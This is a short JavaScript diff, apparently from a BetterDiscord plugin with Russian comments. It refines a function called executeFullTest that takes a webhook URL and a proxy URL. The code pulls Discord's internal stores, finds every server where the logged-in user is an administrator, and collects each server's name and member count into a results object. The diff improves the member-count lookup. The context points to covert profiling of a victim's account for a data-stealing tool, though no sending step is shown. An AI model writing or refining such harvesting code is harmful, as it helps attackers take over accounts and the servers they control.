@@ -34,6 +34,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
+        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
         
         if (GuildStore && PermissionStore) {
             const guilds = GuildStore.getGuilds();
@@ -41,20 +42,21 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
                 // Проверяем право "Администратор" (8n - BigInt)
                 if (PermissionStore.can(8n, g)) {
                     
-                    // Пытаемся достать количество участников разными способами
-                    let count = g.memberCount || g.approximateMemberCount;
+                    let count = 0;
                     
-                    // Если вдруг в объекте пусто, делаем принудительный запрос в GuildStore
+                    // Способ 1: Берем из специализированного хранилища количества
+                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') {
+                        count = GuildMemberCountStore.getMemberCount(g.id);
+                    }
+                    
+                    // Способ 2: Берем из самого объекта гильдии
                     if (!count) {
-                        const freshGuild = GuildStore.getGuild(g.id);
-                        if (freshGuild) {
-                            count = freshGuild.memberCount || freshGuild.approximateMemberCount;
-                        }
+                        count = g.memberCount || g.approximateMemberCount;
                     }
 
                     result.admin_servers.push({
                         name: g.name,
-                        members: count || 0 // Если вообще ничего не нашли, ставим 0
+                        members: count || 0 
                     });
                 }
             }
